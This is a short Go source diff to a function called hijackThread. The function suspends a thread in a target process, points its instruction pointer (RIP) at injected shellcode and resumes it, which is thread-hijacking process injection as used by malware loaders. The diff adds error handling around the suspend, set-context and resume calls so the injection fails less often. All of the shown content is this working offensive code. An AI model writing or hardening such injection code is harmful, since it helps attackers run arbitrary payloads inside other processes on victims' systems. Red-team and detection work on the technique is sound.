@@ -55,7 +55,10 @@ func hijackThread(pid uint32, shellcode []byte) error {
 	}
 	defer procCloseHandle.Call(hThread)
 
-	procSuspendThread.Call(hThread)
+	suspended, _, _ := procSuspendThread.Call(hThread)
+	if suspended == ^uintptr(0) {
+		return fmt.Errorf("SuspendThread failed for thread %d", targetTID)
+	}
 
 	var ctx threadContext
 	ctx.contextFlags = CONTEXT_FULL
@@ -66,7 +69,14 @@ func hijackThread(pid uint32, shellcode []byte) error {
 	}
 
 	ctx.rip = uint64(addr)
-	procSetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
-	procResumeThread.Call(hThread)
+	r3, _, _ := procSetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
+	if r3 == 0 {
+		procResumeThread.Call(hThread)
+		return fmt.Errorf("SetThreadContext failed for thread %d; RIP not redirected", targetTID)
+	}
+	resumed, _, _ := procResumeThread.Call(hThread)
+	if resumed == ^uintptr(0) {
+		return fmt.Errorf("ResumeThread failed for thread %d; thread left suspended with RIP redirected", targetTID)
+	}
 	return nil
 }
